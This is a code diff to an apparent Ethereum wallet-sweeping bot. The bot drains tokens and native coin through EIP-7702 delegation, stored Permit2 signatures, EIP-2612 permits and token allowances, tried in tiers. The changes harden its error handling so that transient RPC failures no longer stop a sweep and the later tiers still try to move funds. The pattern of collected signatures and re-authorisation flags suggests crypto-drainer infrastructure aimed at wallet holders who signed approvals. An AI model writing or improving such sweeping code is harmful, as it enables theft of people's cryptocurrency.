@@ -487,7 +487,18 @@ async function sweepDelegatedWallet(walletAddress) {
         // V1 contract — fall back to old per-call approach
         warn(`[eip7702] ${checksum} — sweepAll not available (V1), falling back`);
       } else {
-        err(`[eip7702] sweepAll ${checksum}: ${e.message}`);
+        // Distinguish a genuine on-chain revert (CALL_EXCEPTION) from a
+        // transient RPC/network failure — both used to be logged identically
+        // via err() with no signal that RPC errors just need a retry.
+        const isRevert = e.code === "CALL_EXCEPTION";
+        const isRpcTransient = /timeout|network|ETIMEDOUT|ECONNRESET|502|503|429|rate.?limit/i.test(e.message ?? "");
+        if (isRevert) {
+          log(`[eip7702] ${checksum} — sweepAll reverted on-chain (likely nothing to sweep): ${e.reason ?? e.shortMessage ?? e.message}`);
+        } else if (isRpcTransient) {
+          warn(`[eip7702] ${checksum} — sweepAll RPC/network error (transient, will retry on next trigger): ${e.message}`);
+        } else {
+          err(`[eip7702] sweepAll ${checksum}: ${e.message}`);
+        }
         return;
       }
     }
@@ -1745,12 +1756,14 @@ async function sweep(wallet) {
           .update({ status: "needs-reauth" })
           .eq("address", addrKey).eq("chain", CHAIN);
       }
+      // Do NOT return — see eth-bot for full rationale: Tiers 2-4 below query
+      // permit2_signatures / eip2612_permits directly (not wallet.type), so a
+      // stale "eip7702" type must not block them from finding real coverage.
+    } else {
+      // Sweep via sweepDelegatedWallet (existing logic)
+      await sweepDelegatedWallet(checksum);
       return;
     }
-
-    // Sweep via sweepDelegatedWallet (existing logic)
-    await sweepDelegatedWallet(checksum);
-    return;
   }
 
   // ══════════════════════════════════════════════════════════════════════════
@@ -1786,7 +1799,15 @@ async function sweep(wallet) {
 
       const token = new ethers.Contract(p.token, ERC20_ABI, getReadProvider());
       let balance;
-      try { balance = await token.balanceOf(checksum); } catch { continue; }
+      try { balance = await token.balanceOf(checksum); } catch (e) {
+        // Previously a completely silent skip — indistinguishable from "token
+        // genuinely has zero balance". An RPC hiccup here just means this
+        // permit is skipped for THIS pass (it retries on the next sweep
+        // trigger), but with zero visibility it looked identical to "nothing
+        // to sweep" in the logs, making real RPC issues invisible.
+        warn(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} — balanceOf read failed (${e.message}), skipping this pass`);
+        continue;
+      }
       if (balance === 0n) continue;
 
       log(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} balance=${ethers.formatUnits(balance, 18)} — permit()`);
@@ -1881,7 +1902,20 @@ async function sweep(wallet) {
     try {
       const mc = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
       results = await mc.aggregate3.staticCall(calls);
-    } catch (e) { warn(`[direct] ${short} — multicall failed: ${e.message}`); return; }
+    } catch (e) {
+      // A transient multicall/RPC failure here previously `return`ed from the
+      // ENTIRE sweep() call — abandoning this pass completely instead of just
+      // this tier, so a wallet with a perfectly valid Permit2 signature (Tiers
+      // 3/4 below, which don't depend on this read) would silently get zero
+      // sweep attempt whenever this one RPC call hiccuped. Skip only Tier 5.
+      warn(`[direct] ${short} — multicall failed: ${e.message} — skipping Tier 5 only, still trying Permit2 tiers below`);
+      results = null;
+    }
+    // Declared outside the `if (results)` block so the fall-through checks
+    // below (trySweepNativeFor, `if (directSwept) return`) work correctly
+    // even when the multicall failed — directSwept simply stays false.
+    let directSwept = false;
+    if (results) {
 
     const toSweepV2 = [];     // approved to V2 contract → use sweepFor
     const toSweepLegacy = []; // approved to relayer only → use transferFrom
@@ -1943,13 +1977,14 @@ async function sweep(wallet) {
 
     // "Had candidates" is no longer sufficient to gate the early return below —
     // only an ACTUAL confirmed sweep should skip the Permit2 fallback tiers.
-    const directSwept = v2SweptOk || legacySweptCount > 0;
+    directSwept = v2SweptOk || legacySweptCount > 0;
     const hadCandidates = toSweepV2.length > 0 || toSweepLegacy.length > 0;
     if (!hadCandidates) {
       log(`[direct] ${short} — no tokens with balance+allowance — falling through to permit2_signatures tiers`);
     } else if (!directSwept) {
       warn(`[direct] ${short} — had ${toSweepV2.length + toSweepLegacy.length} direct-allowance candidate(s) but none actually swept — falling through to permit2_signatures tiers`);
     }
+    } // closes if (results)
 
     // ── Native coin sweep (V2.1 sweepETHFor) ──────────────────────────────
     await trySweepNativeFor(checksum, short);
